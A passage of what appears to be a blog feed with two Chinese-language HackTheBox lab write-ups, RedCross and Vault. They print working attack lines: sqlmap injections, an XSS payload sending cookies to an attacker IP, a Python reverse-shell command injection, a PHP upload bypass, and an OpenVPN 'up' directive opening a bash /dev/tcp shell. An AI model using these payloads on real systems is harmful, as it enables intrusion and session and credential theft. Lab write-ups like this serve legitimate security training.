            </figure>
<p>可使用功能为<a href="https://intra.redcross.htb/?o=1&amp;page=app" target="_blank" rel="noopener">https://intra.redcross.htb/?o=1&amp;page=app</a> 进行uid查询</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01841a7ac5d0e48e68.png" alt title class>
                <p></p>
            </figure>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>o参数存在注入</p>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t01871a604733347089.png" alt title class>
                <p></p>
            </figure>
<p><code>sqlmap -p o -r redcross.req --delay=0.5 –dbs</code></p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01473e493b8695d089.png" alt title class>
                <p></p>
            </figure>
<p><code>sqlmap -p o -r redcross.req --delay=0.5 –D redcross --tables</code><br>[13:43:41] [INFO] fetching tables for database: ‘redcross’<br>[13:43:42] [INFO] used SQL query returns 3 entries<br>[13:43:44] [INFO] retrieved: ‘messages’<br>[13:43:45] [INFO] retrieved: ‘requests’<br>[13:43:46] [INFO] retrieved: ‘users’<br>对数据库redcross的表进行dump获得部分hash以及提示：</p>
<figure class="image-box">
                <img src="https://p1.ssl.qhimg.com/t0107bfe5b675fc743b.png" alt title class>
                <p></p>
            </figure>
<p>hash无利用价值 主要看提示</p>
<h2 id="分站获取"><a href="#分站获取" class="headerlink" title="分站获取"></a>分站获取</h2><p>多次提到admin webapp 管理平台 根据内容来看应该是子域名，直接尝试admin.redcross.htb<br>添加10.10.10.113 admin.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 admin.redcross.htb&quot; &gt; /etc/hosts</code><br>访问admin.redcross.htb</p>
<figure class="image-box">
                <img src="https://p2.ssl.qhimg.com/t01e7ce50d628bcd0c6.png" alt title class>
                <p></p>
            </figure>
<p>此处使用guest尝试登录 显示权限不足，在intra站内有contact页面可通过XSS获取管理员COOKIEs(靶机网站如果有留言板，一般有xss)，通过尝试xss在email处可使用，获取cookie：<br><code>&lt;script&gt;new Image().src=&#39;http://10.10.14.43/&#39;+document.cookie&lt;/script&gt;</code><br>本地监听<br><code>nc –lvp 80</code><br>留言处插入xss<br>得到cookie</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01d08231e66fe5ae3d.png" alt title class>
                <p></p>
            </figure>
<p>PHPSESSID=hi743ili2drfd271v2h0gnj8d7<br>通过修改cookie登录admin.redcross.htb</p>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>网站内有两个功能：添加一个可登录的用户，IP防火墙</p>
<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t019fa8aab97bbc1c9c.png" alt title class>
                <p></p>
            </figure>
<p>添加hack用户 密码9m2TxTgI</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t011b10e8240a730f44.png" alt title class>
                <p></p>
            </figure>
<p>添加可通过ip本机ip以及随意的一个ip</p>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t01ffab3cf9c56db9b8.png" alt title class>
                <p></p>
            </figure>
<p>经过测试在deny功能处的ip参数存在命令注入：<br>通过burp更改数据，进行命令注入，反弹shell：<code>ip=11.11.11.11;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.43&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&amp;id=13&amp;action=deny</code></p>
<figure class="image-box">
                <img src="https://p5.ssl.qhimg.com/t0182f02199070cc51d.png" alt title class>
                <p></p>
            </figure>
<p>获取www-data用户权限<br>权限很低，通过对网站内容进行查看</p>
<h2 id="通过psql获取root权限"><a href="#通过psql获取root权限" class="headerlink" title="通过psql获取root权限"></a>通过psql获取root权限</h2><p>得到psql连接信息<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user= unixnss password= fios@ew023xnw “);<br>经过连接测试<br>用户unixusrmgr拥有较高的权限。<br>登录psql：<br><code>psql -h 127.0.0.1 -U unixusrmgr -d unix -W</code></p>
<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t0178e71f09253ed1fb.png" alt title class>
                <p></p>
            </figure>
<p>登录后发现只有passwd_table有访问权限<br>并且passwd_table存在我们之前添加的hack用户的uid、gid、homedir;<br>尝试修改gid=0、homdir=’/root’<br>修改成功<br>使用用户hack进行ssh登录</p>
<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t01d6301c7d10d02f62.png" alt title class>
                <p></p>
            </figure>
<p>可以看到虽然已经是root的组的了却不能进行敏感文件访问<br>尝试sudo，系统提示当前用户不是sudo组的<br><code>cat /etc/group</code></p>
<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t01371ef23668f9f2ee.png" alt title class>
                <p></p>
            </figure>
<p>得知sudu组为27<br>杀死用户(修改gid或者其他信息的时候,用户不能被使用)<br>kill -9 <code>lsof -u hack</code><br>修改gid=27<br>并重新登录</p>
<figure class="image-box">
                <img src="https://p1.ssl.qhimg.com/t01bef95af8a8a6ecf2.png" alt title class>
                <p></p>
            </figure>
<p>已经可以使用sudo root权限<br>获取root 完成渗透攻击。</p>
<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>复盘写writeup时发现一些其他方式：</p>
<h2 id="获得账号密码"><a href="#获得账号密码" class="headerlink" title="获得账号密码"></a>获得账号密码</h2><p>通过枚举网站目录、文件可获得account_signup.pdf </p>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t017b5a3329e7004fa8.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="https://p4.ssl.qhimg.com/t01cf5f0d21fe84d655.png" alt title class>
                <p></p>
            </figure>
<p>得知通过向contact页面输入标题credentials 内容username=admin，便可得到账号密码</p>
<figure class="image-box">
                <img src="https://p2.ssl.qhimg.com/t01f24b995e254ef185.png" alt title class>
                <p></p>
            </figure>
<p>相较于爆破账号密码会节省很多时间。</p>
<h2 id="获取admin站点的cookie"><a href="#获取admin站点的cookie" class="headerlink" title="获取admin站点的cookie"></a>获取admin站点的cookie</h2><p>在上文我们使用的xss获取cookie，经过测试intra站点中的guest的cookie带入至admin站点依旧有效。</p>
<h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p>在我们向防火墙添加本机ip至防火墙之后，再次进行nmap扫描：</p>
<figure class="image-box">
                <img src="https://p0.ssl.qhimg.com/t01f78d37d072ac8c22.png" alt title class>
                <p></p>
            </figure>
<p> 可以看到服务器开启了21、22、80、443、1025(HARAKA)、5432(psql)<br>通过1025端口的服务在msf进行<br>exploit/linux/smtp/haraka<br>的使用将得到用户penpelope的shell<br>相较于上文少一个命令注入的过程<br>并且权限也比www-data大一些</p>
<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>RedCross是一台更接近于现实的一台机器，它可以有很多路到达root。值得大家去实战练习。</p>
]]></content>
      
        <categories>
            
            <category> HTB靶机渗透实战Writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶机writeup </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTB靶机渗透实战Writeup_Vault]]></title>
      <url>/2019/07/07/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-Vault/</url>
      <content type="html"><![CDATA[<figure class="image-box">
                <img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class>
                <p></p>
            </figure>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Vault的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。</p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/161" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/161</a><br>目标IP: 10.10.10.109(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)<br>信息收集<br>NMAP端口扫描<br>nmap -sC -sV -oA  nmap 10.10.10.109</p>
<p>Nmap scan report for 10.10.10.109<br>Host is up (0.42s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)<br>|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)<br>|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>访问80端口：<br>网站信息</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_33_41_83754" alt title class>
                <p></p>
            </figure>
<p>显示存在平台 sparklays<br>访问10.10.10.109/sparklays<br>403，直接进行目录爆破：</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_33_48_35141" alt title class>
                <p></p>
            </figure>
<p>整理：<br>changelogo.php(可上传图片)</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_33_56_75908" alt title class>
                <p></p>
            </figure>
<p>/uploads/ (为上传文件目录)</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_34_05_65063" alt title class>
                <p></p>
            </figure>
<p>获取反弹shell<br>尝试直接上传PHP文件：<br>失败<br>测试发现是黑名单检测，通过1234.php5绕过限制</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_34_13_70769" alt title class>
                <p></p>
            </figure>
<p>未直接找到地址，<br>我上传的是一个php反弹shell<br>使用nc监听1234端口并访问<br><a href="http://10.10.10.109/sparklays/design/uploads/1234.php5" target="_blank" rel="noopener">http://10.10.10.109/sparklays/design/uploads/1234.php5</a></p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_36_59_97273" alt title class>
                <p></p>
            </figure>
<p>反弹成功获得用户www-data的shell。<br>查看Home目录内并未发现user.txt，发现以下内容：</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_36_06_98456" alt title class>
                <p></p>
            </figure>
<p> DNS + Configurator - 192.168.122.4<br>Firewall - 192.168.122.5<br>The Vault – x<br>dave<br>Dav3therav3123<br>key内容:<br>itscominghome<br>发现主机存在网段192.168.122.x<br>通过ifconfig发现主机网段内ip为192.168.122.1<br>virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49<br>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0<br>发现nc可用 通过nc扫描192.168.122.4开放的端口<br>ifconfig<br>nc -z -v 192.168.122.4 1-100<br>Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!<br>Connection to 192.168.122.4 80 port [tcp/http] succeeded!<br>发现主机开放22、80端口<br>并且之前在目录下发现了ssh用户dave的登录账号密码<br>SSH端口转发<br>通过ssh端口转发并访问本地端口8888(文献参考)<br>ssh -L 8888:192.168.122.4:80 <a href="mailto:dave@10.10.10.109" target="_blank" rel="noopener">dave@10.10.10.109</a></p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_35_48_93640" alt title class>
                <p></p>
            </figure>
<p>访问两个链接发现</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_38_07_99770" alt title class>
                <p></p>
            </figure>
<p>只有vpnconfig可用，但无其他信息，于是继续进行目录爆破<br>通过目录爆破发现/notes目录<br>并且提示有123.ovpn以及一个脚本<br>分别查看</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_38_20_88371" alt title class>
                <p></p>
            </figure>
<p>连接DNS<br>直接使用123.ovpn的内容在vpnconfigurator页面执行<br>remote 192.168.122.1<br>ifconfig 10.200.0.2 10.200.0.1<br>dev tun<br>script-security 2<br>nobind<br>up “/bin/bash -c ‘/bin/bash -i &amp;&gt; /dev/tcp/192.168.122.1/1337 0&gt;&amp;1’”</p>
<p>ubuntu主机监听1337</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_38_51_97958" alt title class>
                <p></p>
            </figure>
<p>可看到已经获取DNF服务器的root，再次查看/home/dave发现user.txt<br>以及一个ssh账号密码与之前的有差异dav3gerous567<br>user权限拿下。</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_39_13_46502" alt title class>
                <p></p>
            </figure>
<p>获取Root<br>连接Vault<br>在ubantu机子上连接dave的ssh：<br>ssh <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a></p>
<p>查看文件<br>/etc/hosts<br>发现新ip<br>192.168.5.2<br>在/var/log/auth.log文件中发现有连接的方法</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_42_28_37331" alt title class>
                <p></p>
            </figure>
<p>可通过在DNS主机发现的DAVE凭据去登录192.168.5.2<br>对192.168.5.2进行端口扫描<br>nmap -Pn -sS -sU -T4 -p- 192.168.5.2<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>53/tcp closed domain<br>4444/tcp closed krb524</p>
<p>通过auto.log得知指定源端口继续扫描可以发现另一个开放端口<br>nmap 192.168.5.2 -Pn –source-port=4444 –f<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>987/tcp open unknown</p>
<p>按照auto.log的方法操作：<br>ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 53” &amp;<br>netstat -antup<br>使用一个可用端口，在DNS上设置一个ncat侦听器，它将使用提供的源端口触发到Vault的连接。检查主机是否成功监听了该端口。</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_43_17_25963" alt title class>
                <p></p>
            </figure>
<p>已成功<br>并且发现是一个ssh服务 于是我们使用dave的账号登录<br>发现一个root.txt.gpg</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_44_14_25742" alt title class>
                <p></p>
            </figure>
<p>尝试解密gpg失败，没有密钥<br>在DNS机器上也没有密钥<br>在Ubantu主机上发现了相同的ID<br>gpg –list-keys<br>/home/dave/.gnupg/pubring.gpg<br>pub 4096R/0FDFBFE4 2018-07-24<br>uid david<br>sub 4096R/D1EB1F03 2018-07-24</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_44_35_67982" alt title class>
                <p></p>
            </figure>
<p>文件传输<br>使用scp将root.txt.gpg传输至ubantu主机<br>思路：<br>vault &gt; dns &gt; ubantu<br>在DNS主机上执行<br>sudo ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 4444” &amp;</p>
<p>scp -P 5555 <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/home/dave/root.txt.gpg /tmp<br>在ubantu主机上执行<br>scp <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/tmp/root.txt.gpg .<br>这里需要一个key<br>就是一开始得到的key: itscominghome<br>获得root.txt:</p>
<figure class="image-box">
                <img src="http://bbs.08sec.org/upload/images/201907/21_44_51_49197" alt title class>
                <p></p>
            </figure>

<p>个人感悟<br>Vault靶机，user.txt获取很简单，只考察一点枚举能力。在root.txt获取上比较麻烦，得找到并理清关系，主机存在Ubantu上，可通过openvpn连接至DNS主机，通过auth.log知道Vault主机，root.txt存在于Vault主机并进行了gpg加密，通过密钥的寻找，确定在ubantu使用key上解密即可得到root.txt<br>文献参考<br>ssh隧道：<a href="https://www.ssh.com/ssh/tunneling/example" target="_blank" rel="noopener">https://www.ssh.com/ssh/tunneling/example</a><br>从OpenVPN配置文件获取反弹shell：<a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a><br>GPG Keys Cheatsheet：<br><a href="https://easyengine.io/tutorials/linux/gpg-keys" target="_blank" rel="noopener">https://easyengine.io/tutorials/linux/gpg-keys</a><br>scp跨机远程拷贝：<br><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html</a></p>
]]></content>
      
        <categories>
            
            <category> HTB靶机渗透实战Writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 靶机writeup </tag>
            
            <tag> hackthebox </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
